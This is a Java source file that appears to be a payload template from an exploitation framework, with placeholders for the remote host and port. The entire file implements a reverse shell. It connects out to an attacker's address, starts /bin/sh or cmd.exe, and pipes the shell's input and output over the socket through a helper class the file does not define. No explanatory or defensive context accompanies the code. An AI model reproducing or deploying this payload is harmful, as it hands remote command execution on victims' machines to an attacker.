//package __PACKAGE__;

import java.net.Socket;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;

public class Payload {
  public static void main(String[] args) {
	System.out.println("bla bla bla");
	String ip = "__RHOST__:__RPORT__";
	new Payload(ip);
  }
 
  public Payload(String ip)
  {
     reverseConn(ip);
  }
  
  public void reverseConn(String ip) {
    String ipport = ip;
    try
    {
      String ShellPath;
      if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1)
        ShellPath = new String("/bin/sh");
      else {
        ShellPath = new String("cmd.exe");
      }
      Socket socket = new Socket(ipport.split(":")[0], 
        Integer.parseInt(ipport.split(":")[1]));
      Process process = Runtime.getRuntime().exec(ShellPath);
      new StreamConnector(process.getInputStream(), 
        socket.getOutputStream()).start();
      new StreamConnector(process.getErrorStream(), 
        socket.getOutputStream()).start();
      new StreamConnector(socket.getInputStream(), 
        process.getOutputStream()).start();
    }
    catch (Exception e) {
      e.printStackTrace();
    }
  }
}
